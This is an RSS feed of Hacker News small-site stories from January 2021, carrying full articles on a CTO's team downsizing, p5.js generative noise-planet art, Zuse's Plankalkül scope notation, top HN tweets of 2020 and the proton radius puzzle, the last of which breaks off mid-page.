<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 11 Jan 2021 20:44:44 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 11 Jan 2021 20:44:44 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[CTO day 2: downsizing the team]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25712771">thread link</a>) | @delebe
<br/>
January 10, 2021 | https://danlebrero.com/2020/12/02/cto-diary-downsizing-team-firing/ | <a href="https://web.archive.org/web/*/https://danlebrero.com/2020/12/02/cto-diary-downsizing-team-firing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p id="entry-summary">On your first day as newly appointed CTO you are working on your hiring strategy, the second day your organization asks you to downsize the team.</p><div><p>A very important project that was a done deal, and that will secure the organization’s future for the next five years, failed to happen.</p><p>Not winning this project meant that the organization was forced to <em>“focus”</em> and reduce costs.</p><p>It never crossed my mind that one of the first things that I would be asked to do as an inexperienced CTO would be to fire part of the team.</p>
<p>when such bad news becomes public, host an open door day where the team can openly talk about the situation, share their feelings, see each other, feel connected, and be listened to. It would not stop the gossiping but it will help.</p><h2>Cuts and team principles</h2><p>The Dev team slice of the <em>“focus”</em> meant cutting cost by 10 to 15%. In human terms, firing two to four people (out of 17).</p><p>After some failed attempts to approach this task, this is what worked for me.</p><p>I started by listing some principles: </p>
<ul>
  <li>For each product, we need to cover the following disciplines: Frontend, Backend, Architecture, Operations, Mobile, UX, Design, QA, Leadership, and Product Management.</li>
  <li>There are broadly 3 experience levels:
  <ul>
    <li>Senior: creates the plan.</li>
    <li>Mid-level: follows the plan.</li>
    <li>Junior: needs to be taught to follow the plan.</li>
  </ul></li>
  <li>No number of junior people can do some work a senior person can do.</li>
  <li>Not having a senior person in a discipline will mean that the product quality will suffer:
  <ul>
    <li>If a senior creates a plan, a team of mid-level+juniors can follow the plan for some time (2-3 years?) before the product becomes a big mess.</li>
    <li>To get out of a big mess, we need senior people.
    <ul>
      <li>We are already in a big mess with Product A and Product B.</li>
      <li>With the current team, it feels Product A is getting out of the mess.</li>
    </ul></li>
  </ul></li>
  <li>Independent (cross-functional) teams are more efficient:
  <ul>
    <li>More focus.</li>
    <li>No handoffs, faster feedback.</li>
    <li>No shared “resource” contention.</li>
  </ul></li>
  <li>People working in multiple products/teams are less efficient.</li>
  <li>Multidisciplinary (generalist) people:
  <ul>
    <li>Can cover the need for several of the disciplines.</li>
    <li>They can be junior in one discipline and senior in another.</li>
    <li>Allow focusing on any priority, without creating artificially important work for single-disciplined members.</li>
  </ul></li>
  <li>Max team size: 2 pizza teams 6-8.</li>
</ul><p>The ideal team would be one that has all disciplines covered at a senior level with multidisciplinary people working in just one team, and with enough overlap to avoid a <a href="https://en.wikipedia.org/wiki/Bus_factor">bus factor</a> of one. Additional people will bring additional capacity.</p><h2>Inverse Conway’s maneuver</h2><p>We have been working on bringing three of the products together for some time. They were already under the same product manager, but they were still three teams working on their own priorities. Merging them into one team, in a classic <a href="https://danlebrero.com/2020/01/08/do-i-need-a-gateway-api-team-dynamics/#content">inverse Conway’s maneuver</a> would hopefully accelerate the integration between the products.</p><p>One of the other products was small enough that for this task I decided to temporarily ignore it.</p><p>Following the principles above and the product considerations, the plan was to move the previous team setup from:</p><p><img src="https://danlebrero.com/images/blog/cto/day2/old-team-structure.jpg" alt="old team structure"> </p><p>To something like (boxes represent skills, not people):</p><p><img src="https://danlebrero.com/images/blog/cto/day2/new-team-structure.jpg" alt="new team structure"> </p><p>So two products, two cross-functional teams. Platforms and design teams will be reshuffled inside those two teams.</p><h2>Which parent do you love most? A computer will tell</h2><p>With a clear plan for the team, the next step was to <em>“just”</em> pick up who will work on each team, and who we will need to let go. The most painful decision in my career. </p>
<blockquote><p><a href="https://danlebrero.com/2019/11/27/becoming-a-technical-leader-book-notes/#content">People with a strong technical background can convert any task into a technical task, thus avoiding work they don’t want to do.</a> <cite>Jerry Weinberg, Becoming a Technical Leader</cite></p>
</blockquote><p>And I didn’t want to do the task so, consciously ignoring Mr. Weinberg, I transformed the ordeal into an optimization problem, for which I wrote an application to help me with.</p><h3>The app</h3><p>The application took as input the amount of $$$ to cut, the list of people, their salary, and the skill level on each discipline mentioned above, and outputted the possible two teams that would be within budget and match the minimum requirements, sorted by a scoring system.</p><p>The minimum requirements and scoring system configuration looked like:</p>
<pre><code>{
"FE" [at-least-senior sum-skills]
"PM" [senior-plus-somebody-else (fix-points 5)]
"Design" [two-mid-or-senior (senior-better 6 2)]
...
}
</code></pre><p>The first function filters out invalid teams while the second scores the valid ones.</p><p>In the example we say that the team has to have:</p>
<ul>
  <li>At least one senior FE developer. The more FE developers, the better team score.</li>
  <li>At least one senior product manager and one mid or junior one. Only one senior is not enough. No matter how many PMs the team has, the score for this discipline is 5. A team with loads of FE devs will score higher than one with loads of PMs.</li>
  <li>At least a senior designer or two mid-level designers, but we prefer one senior designer (6 points) instead of two mid-level ones (2 points).</li>
</ul><h3>The result</h3><p>As heartless as this may seem:</p>
<ul>
  <li>It removed some bias. There is still bias on the skill level evaluation and in the team scoring system.</li>
  <li>I was part of the people on that list. To be honest, little consolation here. Big bias.</li>
  <li>It forced me to be very very precise on what a “functioning team” meant.</li>
  <li>It allowed me to see what different scoring systems would output.</li>
  <li>I noticed some people would never show in the output, and had to dig into why. It was enlightening.</li>
  <li>It allowed me to analyze tens of thousands of different team combinations, with different scoring systems.</li>
  <li>Programming gave me a respite from the task. This was the first time, but now I embrace more regularly “keep my sanity” programming days.</li>
</ul><p>Most important, the application gave me a few starting points. Of those, I still had to consider the team dynamics, existing teams, personalities, seniority, potential, personal situation, future needs, …</p>
<p>yes, I still have the code. No, I am not going to share it publicly. It would kill me to find there is a bug.</p><h2>Delivering the bad news</h2><p>Once the decision was made, it was time to swallow the last bitter pill.</p><p>Some tips:</p>
<ul>
  <li>Ensure that the people affected are the first ones to know.</li>
  <li>Warn beforehand:
  <ul>
    <li>Do not use your regular one-to-one meeting slot.</li>
    <li>In your message, give a strong hint: “HR person will be in the meeting”, “Really bad news”.</li>
    <li>Give them time to get ready for the meeting.</li>
  </ul></li>
  <li>You don’t need to do it alone. Our HR manager was present and was a huge support for both of us.</li>
  <li>Treat people like adults.</li>
  <li>At the meeting, follow Nadia van der Vlies’ <a href="https://danlebrero.com/2020/04/01/no-nonsense-leadership-summary/#bad-news">advice</a>:
  <ul>
    <li>Deliver the blow:
    <ul>
      <li>Go straight to the bad news.</li>
      <li>Give one or two reasons.</li>
    </ul></li>
    <li>Manage the reaction:
    <ul>
      <li>Be understanding. Do not justify yourself.</li>
      <li>Give space. Do not fill silences.</li>
    </ul></li>
    <li>Solution, explanation, follow-up appointment:
    <ul>
      <li>Wait for the employee to be ready. When she starts asking “why” or “what now”.</li>
      <li>Reiterate reasons.</li>
    </ul></li>
  </ul></li>
  <li>In a couple of days follow up with another more informal meeting. The news would have sunk, and the conversation would be more forward-thinking and productive.</li>
</ul>
<hr><p>A slap in the face to awaken me from the dream that a CTO role is mostly about technology.</p></div></div>]]>
            </description>
            <link>https://danlebrero.com/2020/12/02/cto-diary-downsizing-team-firing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712771</guid>
            <pubDate>Sun, 10 Jan 2021 09:27:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Noise Planets (Generative Art)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712767">thread link</a>) | @atulvi
<br/>
January 10, 2021 | https://avinayak.github.io/art/2021/01/09/noise-planets.html | <a href="https://web.archive.org/web/*/https://avinayak.github.io/art/2021/01/09/noise-planets.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><img src="https://avinayak.github.io/uploads/erporydxmaarwcd.png" alt=""></p>

<p>I recently found this piece of art (LINES 2A (2017)) created by <a href="https://twitter.com/tylerxhobbs">Tyler Hobbs</a>. This picture kinda looked very hand drawn, but it’s completely generative. Something about this drawing and it’s texture kind of resonated with me, so I wanted to try to study and replicate (or make something inspired by this work) using p5js.</p>

<p>I started out by plotting a bunch of random points within a circle like so.</p>

<div><div><pre><code>w = 1000
function setup() {
  createCanvas(w, w);
  background('#F9F8F4');
}

function draw() {
  x = random(w)
  y = random(w)
  if (pow(w/2 - x, 2) + pow(w/2 - y, 2) &lt; 7e4) {
    point(x,y)
  }
}
</code></pre></div></div>

<p><img src="https://avinayak.github.io/uploads/download-25.png" alt=""></p>

<p>This is a painfully slow process to generate random points in a circle. I found a better way to do this later. What I wanted to do next was to generate flow fields, but restricted to the circular region.</p>

<p>It’s super easy to generate flow field patterns using perlin noise.</p>

<ol>
  <li>Choose a random point <code>&lt;x,y&gt;</code></li>
  <li>Plot <code>&lt;x,y&gt;</code></li>
  <li>Calculate <code>n = noise(x,y)</code></li>
  <li>Do <code>x+=cos(n * 2 * PI)</code> and <code>y+=sin(n * 2 * PI)</code></li>
  <li>Repeat 2.</li>
</ol>

<p>We’re going to plot flow fields inside the circle. Let’s try this.</p>

<div><div><pre><code>const is_in_circle = (x, y) =&gt; 
  (pow(w / 2 - x, 2) + pow(w / 2 - y, 2) &lt; 7e4)

function draw() {
  if (is_in_circle(x = random(w), y = random(w)))
    while (is_in_circle(x, y)) {
      n = noise(x, y)
      x += sin(n * TAU)
      y += cos(n * TAU)
      point(x, y)
    }
}
</code></pre></div></div>

<p><img src="https://avinayak.github.io/uploads/download-28.png" alt=""></p>

<p>OK, not very good. The noise at this level is pretty rough. we’re going to zoom in to the noise function (by dividing the <code>x,y</code> inputs by some constant value) and probably use <code>circle(x ,y ,0.3)</code> to plot points instead if point function, because I feel it looks way smoother. Also, I’m adding a <code>random() &gt; 0.01</code> condition in the loop so that we also get short lines that are not trimmed away by the edge of the circle.</p>

<div><div><pre><code>function draw() {
  if (is_in_circle(x = random(w), y = random(w)))
    while (is_in_circle(x, y) &amp;&amp; random() &gt; 0.01) {
      n = noise(x / 500, y / 500)
      x += sin(n * TAU)
      y += cos(n * TAU)
      circle(x, y, .3)
    }
}
</code></pre></div></div>

<p><img src="https://avinayak.github.io/uploads/download-27.png" alt=""></p>

<p>Actually.. not bad. I think we manage almost replicate the original texture. The inverted version also looks pretty good.</p>

<p><img src="https://avinayak.github.io/uploads/download-19.png" alt=""></p>

<p><img src="https://avinayak.github.io/uploads/ppanets.png" alt=""></p>

<p>I went ahead and made a つぶやきProcessing version of this.</p>

<blockquote><p lang="en" dir="ltr">function setup(){createCanvas(w=1e3,w),background("<a href="https://twitter.com/hashtag/%E3%81%A4%E3%81%B6%E3%82%84%E3%81%8DProcessing?src=hash&amp;ref_src=twsrc%5Etfw">#つぶやきProcessing</a>")}function draw(){if(g(x=random(w),y=random(w)))for(;g(x,y)&amp;&amp;random()&gt;.01;)n=noise(x/500,y/500),x+=sin(n_TAU),y+=cos(n_TAU),circle(x,y,.3)}g=((n,o)=&gt;pow(w/2-n,2)+pow(w/2-o,2)&lt;w*w/16); <a href="https://t.co/iVZTMtCn3i">pic.twitter.com/iVZTMtCn3i</a></p>— yakinavault (@yakinavault) <a href="https://twitter.com/yakinavault/status/1347903013042622467?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote>


<h2 id="going-further-animations">Going Further: Animations</h2>

<p>The code we wrote right now technically is animated. The animation however is not very smooth.</p>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_03-52-31.mp4" type="video/mp4"> </video>

<p>To make smooth animations, we need to generate new points in the circle, keep track of these points outside the <code>draw()</code> function. I found this neat <a href="https://stackoverflow.com/a/50746409">technique</a>, to find random points in a circle where a random radius <code>r</code> and angle <code>theta</code> are chosen and the <code>x,y</code> points are obtained as <code>x = centerX + r * cos(theta)</code> and <code>y = centerY + r * sin(theta)</code></p>

<p>Let’s try that first.</p>

<div><div><pre><code>function random_point() {
  r = random(w / 4)
  t = random(TAU)
  return [
    w/2 + cos(t) * r, 
    w/2 + sin(t) * r
  ]
}

function setup() {
  createCanvas((w = 1e3), w);
  background(255)
  k = w / 2
  m = (Array(w).fill(0)).map(random_point)
}

function draw() {
  for (i = k; --i;) {
    [x, y] = m[i]
    circle(x, y, .3);
  }
}
</code></pre></div></div>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-01-10-04-51-20.png" alt=""></p>

<p>and now we apply flow fields and try to move these points.</p>

<div><div><pre><code>function random_point() {
  r = random(w / 4)
  t = random(TAU)
  return [
    w/2 + cos(t) * r, 
    w/2 + sin(t) * r
  ]
}

const w = 1000
function setup() {
  createCanvas(w, w);
  background('#F9F8F4')
  k = w / 2
  points = (Array(k).fill(0)).map(random_point)
}

function draw() {
  for (i = k; --i;) {
    [x, y] = m[i]
    x += sin(n = noise(x / 400, y / 400) * TAU) * h
    y += cos(n) * h
    stroke(i%255)
    circle(x, y,.3)
    if (pow(k - x, 2) + pow(k - y, 2) &lt; 7e4)  // if point is in circle
      points[i] = [x, y, t]
    else points[i] = random_point() // replace with new point if not
  }
}
</code></pre></div></div>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_04-56-11.mp4" type="video/mp4"> </video>

<p>And a つぶやきProcessing version of course..</p>

<blockquote><p lang="cy" dir="ltr">t=0,p=i=&gt;\[k+(r=random(w/4))_cos(t+=.1),k+r_sin(t)\],setup=i=&gt;{createCanvas(w=1e3,w),m=Array(k=w/2).fill(0).map(p)},draw=r=&gt;{for(i=k;--i;)\[x,y\]=m\[i\],x+=sin(n=noise(x/k,y/k)_TAU),y+=cos(n),stroke(i%4_85),point(x,y),k_w+x_x+y_y-w_(x+y)&lt;7e4?m\[i\]=\[x,y\]:m\[i\]=p()};//<a href="https://twitter.com/hashtag/%E3%81%A4%E3%81%B6%E3%82%84%E3%81%8DProcessing?src=hash&amp;ref_src=twsrc%5Etfw">#つぶやきProcessing</a> <a href="https://t.co/xVhCBNUltL">pic.twitter.com/xVhCBNUltL</a></p>— yakinavault (@yakinavault) <a href="https://twitter.com/yakinavault/status/1347930637227855874?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote>


<h2 id="adding-colors">Adding Colors</h2>

<p>There are many strategies to colorizing this sketch. One is by just giving each particle a random initial color.</p>

<p><img src="https://avinayak.github.io/uploads/download-21.png" alt=""></p>

<p>However, I found that maintaining the initial x or y position in the particle array and using that to derive the hue information gives us some nice Jupiter/gaseous planet vibes.</p>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_05-18-19.mp4" type="video/mp4"> </video>

<p>The fringing at the sides can be avoided by moving 50% of the points in the reverse direction.</p>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_05-28-03.mp4" type="video/mp4"> </video>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_08-43-25.mp4" type="video/mp4"> </video>

<p>More color variations</p>

<p><img src="https://avinayak.github.io/uploads/untitled.png" alt=""></p>

<p>And that’s it. Hope this was educational!</p>

</div></div>]]>
            </description>
            <link>https://avinayak.github.io/art/2021/01/09/noise-planets.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712767</guid>
            <pubDate>Sun, 10 Jan 2021 09:26:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blocks Courtesy of Konrad Zuse (2014)]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25712727">thread link</a>) | @todsacerdoti
<br/>
January 10, 2021 | https://journal.infinitenegativeutility.com/blocks-courtesy-of-konrad-zuse | <a href="https://web.archive.org/web/*/https://journal.infinitenegativeutility.com/blocks-courtesy-of-konrad-zuse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Apparently, I've got a theme going of Weird Syntax. Let's run with it.</p>

<p>Konrad Zuse was an early pioneer in computer science, although his name is perhaps somewhat less well-known than others. Zuse holds the honor of having built the first programmable computer—-the Z3—-back in the 40's, as well as several other computing firsts<sup id="fnref:1"><a href="#fn:1" rel="nofollow">1</a></sup>. Of particular interest to this blog post is his early unimplemented programming language, Plankalkül.</p>

<p>Plankalkül was, like the Z3, in many respects ahead of its time. Zuse's explicit goal was to be able to describe programs at a high level, which meant he included control structures and datatype definitions<sup id="fnref:2"><a href="#fn:2" rel="nofollow">2</a></sup> and other high-level constructs that were often missing in languages of the early years of computing. Zuse was working on Plankalkül at a time when his machines were not useable, which meant that his language work was more theoretical than it was technical, and consequently he allowed features that he wasn't entirely sure how to program. Despite his notes on it having been written in the mid-40's, they were not published until the 70's, and it was not implemented until the year 2000.</p>

<p>One thing that struck me, as I read programs in this notation that had been set down on a typewriter<sup id="fnref:3"><a href="#fn:3" rel="nofollow">3</a></sup>, is that certain kinds of grouping were handled by explicit indication of scope: not via matched delimiters as in ALGOL-style languages, or via indentation in languages such as Python and Haskell, but by formatting the code so that a line bordered on the left of the scoped parts of the code:</p>

<p><img src="https://blog.infinitenegativeutility.com/static/zuse-01.png" alt=""></p>

<p>This is meant to capture the way grouping works in the hand-written or typeset notation, with brackets spanning multiple lines:</p>

<p><img src="https://blog.infinitenegativeutility.com/static/zuse-02.png" alt=""></p>

<p>I think this is notationally interesting: it's like Python's significant whitespace, but not, uh, whitespace. It would be incredibly tedious to type out, but still entirely compatible with current programming notation:</p>

<pre><code>class Tet
 | @staticmethod
 | def new_tet()
 |  | n = randint(0, len(Tet.Tets) - 1)
 |  | for p in Tet.Tets[n]
 |  |  | if p in Board.permanent
 |  |  |  | Game.lose()
 |  | Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 |
 | def __init__(self, points, color)
 |  | self.points = points
 |  | self.color = color
</code></pre>

<p>and would be entirely amenable to beautifying via judicious application of Unicode:</p>

<pre><code>class Tet
 ┃ @staticmethod
 ┃ def new_tet()
 ┃  ┃ n = randint(0, len(Tet.Tets) - 1)
 ┃  ┃ for p in Tet.Tets[n]
 ┃  ┃  ┃ if p in Board.permanent
 ┃  ┃  ┗  ┗ Game.lose()
 ┃  ┗ Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 ┃
 ┃ def __init__(self, points, color)
 ┃  ┃ self.points = points
 ┃  ┗ self.color = color
</code></pre>

<p>Looking at this notation, however, an interesting possibility struck me: a programmer could explicit annotate information about the <em>kind of scope</em> involved in a given line. In this Python-like example, I could, for example, distinguish class scope using double lines, function scope with thick lines, and control structure scope with thin lines:</p>

<pre><code>class Tet
 ║ @staticmethod
 ║ def new_tet()
 ║  ┃ n = randint(0, len(Tet.Tets) - 1)
 ║  ┃ for p in Tet.Tets[n]
 ║  ┃  │ if p in Board.permanent
 ║  ┃  └  └ Game.lose()
 ║  ┗ Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 ║
 ║ def __init__(self, points, color)
 ║  ┃ self.points = points
 ║  ┗ self.color = color
</code></pre>

<p>One advantage of this scheme is that a handful of lines, viewed in isolation, still give you a clear view of what surrounds them. For example, I can view these two lines in isolation and still tell that they are within a control structure used within a function declared within a class:</p>

<pre><code> ║  ┃  │ if p in Board.permanent
 ║  ┃  └  └ Game.lose()
</code></pre>

<p>You could also imagine a hypothetical language in which choice of scope delimiter is important. In Python, <code>for</code> and <code>if</code> do not form a new lexical scope. What if instead we could stipulate the kind of scope they form by this notational convention?</p>

<pre><code>def okay()
 ┃ if True
 ┃  └ n = 5   # n is declared in function scope
 ┗ return n   # n leaks out of the if-scope

def not_okay()
 ┃ if True
 ┃  ┗ n = 5   # n is declared in the if's scope
 ┗ return n   # error: no n in scope here
</code></pre>

<p>That being said, there are a number of reasons that this notation is in inferior to existing notations:</p>
<ul><li>It makes refactoring code <em>much</em> more difficult.</li>
<li>It requires that the programmer <em>pay attention</em> to the sequence of enclosing scopes on a <em>line-by-line</em> basis, which is generally too pedantic and not particularly useful for a programmer.</li>
<li>The ability to select “which kind of scope” is by no means only expressible by this notation, as other syntactic features such as keywords and delimiters could express the same thing.</li>
<li>There are only so many line-like characters which can serve as a scope marker, so this scheme is not very extensible.</li>
<li>It complicates parsing (especially by introducing an entirely new class of parse errors in which adjacent lines feature incompatible sequences of delimiting lines), and so it also...</li>
<li>Complicates parse <em>error messages</em>, which are an important part of a language's UI and should be considered seriously.</li></ul>

<p>So, as in my previous post on <a href="https://journal.infinitenegativeutility.com/2014/8/noun-case" rel="nofollow">grammatical case in programming languages</a>, I urge readers <em>not</em> to use this notation as the concrete syntax for a programming language. This is merely an entertaining peek through the looking glass at a curious notational convention which was never adopted.</p>

<p>That said: this makes a very nice notation for <em>viewing</em> code, where the programmer does not have to explicitly draw ASCII art around their code; indeed, it bears more than a passing similarity to the graphical interface used in <a href="http://scratch.mit.edu/" rel="nofollow">Scratch</a>, and Sean McDirmid's <a href="http://research.microsoft.com/en-us/projects/liveprogramming/typography.aspx" rel="nofollow">Experiments in Code Typography</a> features this very convention as an interactive ornament on code in a Python-like language.</p>

</div></div>]]>
            </description>
            <link>https://journal.infinitenegativeutility.com/blocks-courtesy-of-konrad-zuse</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712727</guid>
            <pubDate>Sun, 10 Jan 2021 09:21:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Ranked Tweets on Hacker News 2020]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25712499">thread link</a>) | @hgarg
<br/>
January 10, 2021 | https://harishgarg.com/writing/hacker-news-front-page-tweets-2020/ | <a href="https://web.archive.org/web/*/https://harishgarg.com/writing/hacker-news-front-page-tweets-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <ul>
<li>Data curated from <a target="_blank" rel="noopener" href="http://explorehackernews.xyz/?ref=harishgarg.com">Hacker News Front Page Explorer</a></li>
</ul>
<p>1.Every Google result now looks like an ad </p><p>2.macOS unable to open any non-Apple application </p><p>3.John Conway has died </p><p>4.iOS14 reveals that TikTok may snoop clipboard contents every few keystrokes </p><p>5.This electrical transmission tower has a problem </p><p>6.Apple does not keep the 30% commission on a refund </p><p>7.AWS forked my project and launched it as its own service </p><p>8.Google no longer providing original URL in AMP for image search results </p><p>9.Guido van Rossum joins Microsoft </p><p>10.When a customer refunds your paid app, Apple refunds its 30% cut </p>
<p>Get the Full list (162 records) <a target="_blank" rel="noopener" href="https://gum.co/hacker-news-tweets-2020">here for FREE</a></p>
<p>Want to run this and other kind of analysis on your own? Get the Full Database <a target="_blank" rel="noopener" href="http://explorehackernews.xyz/?ref=harishgarg.com">here</a></p>

  </div></div>]]>
            </description>
            <link>https://harishgarg.com/writing/hacker-news-front-page-tweets-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712499</guid>
            <pubDate>Sun, 10 Jan 2021 08:52:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Breakthrough in Measuring the Building Blocks of Nature]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25712475">thread link</a>) | @CapitalistCartr
<br/>
January 10, 2021 | http://m.nautil.us/blog/a-breakthrough-in-measuring-the-building-blocks-of-nature | <a href="https://web.archive.org/web/*/http://m.nautil.us/blog/a-breakthrough-in-measuring-the-building-blocks-of-nature">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

			<figure data-alt=""><img src="http://static.nautil.us/18082_ad5db5924e3e97ed8a387a499efa9fa0.jpg" width="733" alt=""><figcaption><span><i>An artistic rendering of the quarks and gluons that make up a proton.</i></span><span>Illustration by D. Dominguez / CERN</span></figcaption></figure><p><span>I</span>n a recent experiment done at the Max Planck Institute for Quantum Optics, in Germany, physicist Alexey Grinin and his colleagues came a step closer to resolving one of the more significant puzzles to have arisen in particle physics over the past decade. The puzzle is this: Ordinarily, when you set about measuring the size of something, you’d expect to get the same answer no matter what you use to measure it—a soda can has the diameter it does whether you measure it with a tape measure or callipers (provided these are properly calibrated, of course). Something must be amiss if your attempts to measure the can return different answers depending on the equipment, yet this is precisely what’s happened over multiple attempts to measure the spatial extent of a proton. What’s potentially at stake is our understanding of the building blocks of reality: the <a href="https://science.sciencemag.org/content/370/6520/1061.abstract" target="_blank">differing measurements</a> could be heralding the existence of new forces or particles.</p><p>What does it mean for a subatomic particle to have a measurable “size”? Mathematically, fundamental particles are idealized as point particles, which is to say that, as far as we can tell, they have no meaningfully discernible spatial extent, or substructure, at all. True, all fundamental particles are associated with a quantum mechanical wave packet, which does have a spatial extent that depends on the energy of the particle. Yet these basic bits of Lego are entities whose wave packets you can, in principle, pack into as small a region as you’d like before the very notion of continuum geometry starts, at the Planck scale, to lose meaning. Fundamental particles organize into something analogous to a mini periodic table—consisting of the various force carrying particles, such as photons and gluons (the carrier particles of the strong nuclear force), along with three generations of quarks and leptons and the mass-generating Higgs boson—and can stack together in different combinations to form a zoo of so-called composite particles.</p><blockquote><p>There is less than one in about a trillion chance that the discrepancy could be a statistical fluke.</p> </blockquote><p>Perhaps the most familiar and ubiquitous of these is the proton. With at least one in every kind of element, it’s made up of two up quarks and a down quark that dance around each other in a tightly bound orbit maintained by exchanging gluons. This exchange process is so energetic that most of the mass of the proton (or for that matter, most of the material that makes us up) derives from the energy contained in these gluons—a consequence, as Einstein informed us, of <i>E</i> being equal to <i>mc</i><sup>2</sup>.&nbsp;<br></p><figure data-alt=""><img src="http://static.nautil.us/18083_78b8d6620afcd434a4b7fb41b22e595b.png" width="733" alt=""><figcaption><span><i>Fundamental particles organize into something analogous to a mini periodic table (above).</i></span><span>CERN</span></figcaption></figure><p>So it’s not meaningless to ask what the “size” of the proton is. The study by Grinin’s team highlights the fact that defining this notion remains a rather tricky affair. And, as we’ll see, their results serve to sharpen the mystery as to why other measurement methods researchers have used previously disagree.<br></p><p>A physicist can reasonably infer a proton’s size from the “charge radius”—roughly the averaged spatial extent of quark orbits inside. This quantity is probed in slightly different ways by electrons and muons (another sort of fundamental particle), when you probe their orbital configurations as they form “bound states” with the proton—atomic hydrogen in the case of electrons, muonic hydrogen in the case of muons. Because muons are about 200 times heavier than electrons, their lowest energy orbital configurations are much more tightly bound around the proton than are electrons in atomic hydrogen. Consequently, the differences in the energies of various orbitals in muonic hydrogen are much more sensitive to the proton’s size as well as being more “high pitched” than that of regular atomic hydrogen.&nbsp;</p><p>In other words, similar to how plucking a guitar string at a given tension produces a much higher note were we to fret it open, or at 1/200th its open length, the typical frequencies of the radiation emitted by transitions in muonic hydrogen are about 200 times higher than that in atomic hydrogen. These frequencies relate to something called the Rydberg constant—the tension of the guitar string in the analogy—which appears to be one of the potentially more significant sources of uncertainty proton size-wise. Orbital energy levels depend on both this constant and the charge radius of the proton.</p><p>Proton-size measurements didn’t conflict for decades. Different methods—like measuring the radius by observing electrons orbit within hydrogen atoms, or by scattering energetic electrons off of unbound protons—had converged on a value of 0.875 (give or take 0.006) femtometers. That’s a little less than a trillionth of a millimeter. That convergence was disrupted in 2010, when a paper came out titled, “The size of the proton.” As the researchers reported, <a href="http://www.quantum.physik.uni-potsdam.de/teaching/ss2015/pqt/Pohl2010.pdf" target="_blank">measurements</a> involving orbital configurations in muonic hydrogen returned a value of 0.842, give or take 0.001 femtometers. This may not seem like much of a difference, but it’s the accompanying error bars that matter. The measurements are, individually, so precise that their disagreement is over seven standard deviations—there is less than one in about a trillion chance that the discrepancy could be a statistical fluke.</p><p>There are only two possibilities for the anomalous result if the equipment used in the experiments and their calibrations all check out after careful scrutiny. Either some combination of physical constants, which researchers assume in order to experimentally infer the proton charge radius, isn’t known as accurately as we thought, or there is something different about the way muons interact with protons, compared to electrons, that renders particle physics incomplete.</p><p>The latter possibility, if substantiated, would, of course, cause a flurry of excitement among theoretical physicists to say the least, as it could imply the existence of new forces and particles. Not only would it reshape our understanding of the universe, it would represent a throwback to the days when physicists discovered particles (<a href="https://timeline.web.cern.ch/anderson-and-neddermeyer-discover-muon" target="_blank">such as the muon itself</a>) using equipment that could fit on a proverbial tabletop.</p><div id="inpagesub">
	<p>Get the <span>Nautilus</span> newsletter</p>
<p>
	The newest and most popular articles delivered right to your inbox!
</p>
			<!-- Begin MailChimp Signup Form -->
			




